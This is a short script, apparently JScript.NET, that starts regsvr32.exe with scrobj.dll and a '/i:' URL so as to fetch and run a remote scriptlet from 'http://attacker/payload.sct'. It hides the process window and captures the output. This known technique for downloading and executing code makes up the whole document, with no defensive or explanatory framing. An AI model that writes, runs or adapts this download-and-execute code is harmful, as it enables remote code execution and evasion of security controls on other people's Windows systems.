(function(url) {
    var psi = new System.Diagnostics.ProcessStartInfo("regsvr32.exe", "/s /n /u /i:" + url + " scrobj.dll");
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.CreateNoWindow = true;
    var p = System.Diagnostics.Process.Start(psi);
    var output = p.StandardOutput.ReadToEnd();
    var error = p.StandardError.ReadToEnd();
    p.WaitForExit();
    return "Exit: " + p.ExitCode + "\nOut: " + output + "\nErr: " + error;
})("http://attacker/payload.sct")
